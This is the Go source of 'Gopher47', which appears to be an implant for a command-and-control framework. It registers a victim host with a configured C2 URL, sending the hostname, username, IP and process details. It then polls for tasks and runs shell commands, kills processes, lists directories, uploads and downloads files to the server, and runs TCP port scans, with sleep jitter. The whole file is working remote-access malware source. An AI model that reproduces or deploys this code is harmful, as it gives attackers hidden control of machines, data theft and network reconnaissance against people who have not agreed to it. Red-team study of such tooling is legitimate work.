package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/user"
	"log" // only for debugging
	"strconv"
	"strings"
	"time"

	functions "github.com/An00bRektn/gopher47/pkg/agentfuncs"
	"github.com/An00bRektn/gopher47/pkg/utils"
	"github.com/elastic/go-sysinfo"
)

// Globals
// Only HTTP for now
var (
	c = utils.GetConfig()
	url = c.Url
	sleepTime = c.SleepTime
	jitterRange = c.JitterRange
	magicBytes = []byte("\x67\x6f\x67\x6f")
	timeoutThreshold = c.TimeoutThreshold
	timeoutCounter = -1
	// agentId set in main() because random seeding
	agentId = ""
)


func checkError(e error){
	if e != nil {
		panic(e)
	}
}

func genHeader(length int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyz")
    header := make([]rune, length)
    for i := range header {
        header[i] = letters[rand.Intn(len(letters))]
    }
    return string(header)
}

func registerAgent(url string, magic []byte, agentId string) string{
	host, err := sysinfo.Host()
	hostInfo := host.Info()
	checkError(err)
	proc, _ := sysinfo.Self()
	procInfo, _ := proc.Info()

	hostname := hostInfo.Hostname
	currentuser, _ := user.Current()
	procPath, _ := os.Executable()

	registerDict := map[string]string{
		"AgentID": agentId,
		"Hostname": hostname,
		"Username": currentuser.Username,
		"Domain": "",
		"InternalIP": utils.FindNotLoopback(hostInfo.IPs),
		"Process Path": procPath,
		"Process ID": strconv.Itoa(procInfo.PID),
		"Process Parent ID": strconv.Itoa(procInfo.PPID),
		"Process Arch": "x64",
		"Process Elevated": "0",
		"OS Build": hostInfo.OS.Build,
		"OS Arch": hostInfo.Architecture,
		"Sleep": strconv.Itoa(c.SleepTime),
		"Process Name": procInfo.Name,
		"OS Version": hostInfo.OS.Name + " " + hostInfo.OS.Version,
	}

	dat, _ := json.Marshal(registerDict)
	requestDat := `{"task":"register","data":` + string(dat) + "}"

	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
	size := len(requestDat)+12
	sizeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBytes, uint32(size))

	// https://stackoverflow.com/questions/8461462/how-can-i-use-go-append-with-two-byte-slices-or-arrays
	// agentHeader = sizeBytes + magicBytes + agentId
	agentHeader := append(sizeBytes, magic...)
	agentHeader = append(agentHeader, []byte(agentId)...)

	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
	checkError(err)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", strconv.Itoa(size))

	client := &http.Client{}
    res, err := client.Do(req)
	if (err != nil){
		return "failed"
	}
    defer res.Body.Close()

	resBody, _ := ioutil.ReadAll(res.Body)
	if (string(resBody) == "" || resBody == nil) {
		return "failed"
	}

	return string(resBody)
}

func checkIn(dat string, checkInType string) string{
	requestDat := `{"task":"`+checkInType+`","data":"` + string(dat) + `"}`

	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
	size := len(requestDat) + 12
	sizeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBytes, uint32(size))

	// https://stackoverflow.com/questions/8461462/how-can-i-use-go-append-with-two-byte-slices-or-arrays
	// agentHeader = sizeBytes + magicBytes + agentId
	agentHeader := append(sizeBytes, magicBytes...)
	agentHeader = append(agentHeader, []byte(agentId)...)

	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
	if os.IsTimeout(err) || err != nil {
		timeoutCounter += 1
	} else {
		timeoutCounter = 0
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", strconv.Itoa(size))

	client := &http.Client{}
    res, err := client.Do(req)
    if os.IsTimeout(err){
		timeoutCounter += 1
	} else {
		timeoutCounter = 0
	}
    defer res.Body.Close()

	resBody, _ := ioutil.ReadAll(res.Body)
	return string(resBody)
}

func validateArgs(cmdArgs []string) bool {
	// shhh not scuffed not scuffed not scuffed not scuffed
	if len(cmdArgs) < 2 && utils.Strip(cmdArgs[0]) != "o7" {
		return false
	} else {
		return true
	}
}

func RunCommand(command string) string {
	output := ""
	cmdArgs := strings.Fields(command)
	//log.Println([]byte(command))

	if validateArgs(cmdArgs) {
		switch (utils.Strip(cmdArgs[0])){
		case "shell":
			output = functions.Shell(cmdArgs[1:])
		case "o7":
			os.Exit(2)
		case "kill":
			pid, err := strconv.Atoi(cmdArgs[1])
			if (err != nil) {
				output = "[!] Golang Error: " + string(err.Error())
			} else {
				output = string(functions.Kill(pid).Error())
			}
		case "ls":
			output = functions.Ls(cmdArgs[1])
		case "upload":
			params := strings.Split(command[7:], ";")
			//log.Println(params)
			output = functions.Upload(params[0], params[1])
		case "download":
			params := strings.Split(command[9:], ";")
			//log.Println(params)
			encDat := functions.Download(params[0])
			// check if download errored
			if encDat[0:2] == "[!]"{
				output = encDat
			} else {
				outputJson := map[string]string{
					"filename": params[1],
					"data": encDat,
					"size": strconv.Itoa(len(encDat)),
				}
				// there shouldn't be an error from this but prayge
				final, _ := json.Marshal(outputJson)
				output = string(final) 
			}
		case "portscan":
			var ports []int
			log.Println(cmdArgs)

			// ports addr workers
			if cmdArgs[1] == "common" {
				log.Println("Common scan!")
				// from awk '$2~/tcp$/' /usr/share/nmap/nmap-services | sort -r -k3 | head -n 1000 | tr -s ' ' | cut -d '/' -f1 | sed 's/\S*\s*\(\S*\).*/\1,/'
				ports = []int{
					5601, 9300, 80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111,
					995, 993, 5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001, 10000, 514, 5060, 179,
					1026, 2000, 8443, 8000, 32768, 554, 26, 1433, 49152, 2001, 515, 8008, 49154, 1027, 5666, 646,
					5000, 5631, 631, 49153, 8081, 2049, 88, 79, 5800, 106, 2121, 1110, 49155, 6000, 513, 990, 5357,
					427, 49156, 543, 544, 5101, 144, 7, 389, 8009, 3128, 444, 9999, 5009, 7070, 5190, 3000, 5432,
					1900, 3986, 13, 1029, 9, 5051, 6646, 49157, 1028, 873, 1755, 2717, 4899, 9100, 119, 37, 1000,
					3001, 5001, 82, 10010, 1030, 9090, 2107, 1024, 2103, 6004, 1801, 5050, 19, 8031, 1041, 255,
				}
			} else if cmdArgs[1] == "all" {
				//log.Println("All scan!")
				// is hardcoding this more efficient? yes.
				// do I want that huge wall in my code? not really.
				for i := 0; i < 65535; i++ {
					ports = append(ports, i)
				}
			} else {
				//log.Println("Only scanning " + cmdArgs[1])
				// convert comma separated list of ints to actual list of ints
				nums := strings.Split(cmdArgs[1], ",")
				for _, num := range nums {
					n, err := strconv.Atoi(num)
					if err != nil {
						output = "[!] Error: " + err.Error()
					}
					ports = append(ports, n)
				}
			}
			workers, err := strconv.Atoi(cmdArgs[3])
			if workers < 1 {
				output = output + "\n[!] Error: Concurrent scans cannot be less than 1!"
			}
			if err != nil {
				output = output + "\n[!] Error: " + err.Error()
			}
			if output == "" {
				//log.Println("Starting scan!")
				output = functions.PortScanTCP(cmdArgs[2], ports, workers)
			}
			return strings.Trim(output, ",")
		}
	} else {
		output = "[!] Insufficient arguments"
	}
	return output
}

func main(){
	rand.Seed(time.Now().UnixNano())
	agentId = genHeader(4)

	// Attempt to register
	registered := "failed"
	for registered == "failed"{
		registered = registerAgent(url, magicBytes, agentId)
		time.Sleep((time.Duration(5) * time.Second))
		timeoutCounter += 1
		if timeoutCounter > timeoutThreshold {
			os.Exit(0)
		}
	}
	timeoutCounter = 0
	//log.Println("[+] Gopher47 has checked in!")

	command := ""
	out := ""
	r := 1
	// Begin execution
	for {
		command = checkIn("", "gettask")
		if (len(command) > 4) {
			//log.Println("[*] New Task: " + command)
			//log.Println([]byte(utils.Strip(strings.Fields(command)[0])))
			out = RunCommand(utils.Strip(command[4:]))
			if utils.Strip(strings.Fields(command[4:])[0]) == "download"{
				checkIn(utils.JsonEscape(out), "download")
			} else {
				checkIn(utils.JsonEscape(out), "commandoutput")
			}
		}
		r = rand.Intn(jitterRange)
		time.Sleep((time.Duration(sleepTime) * time.Second) + (time.Duration(r) * time.Microsecond))
	}
}
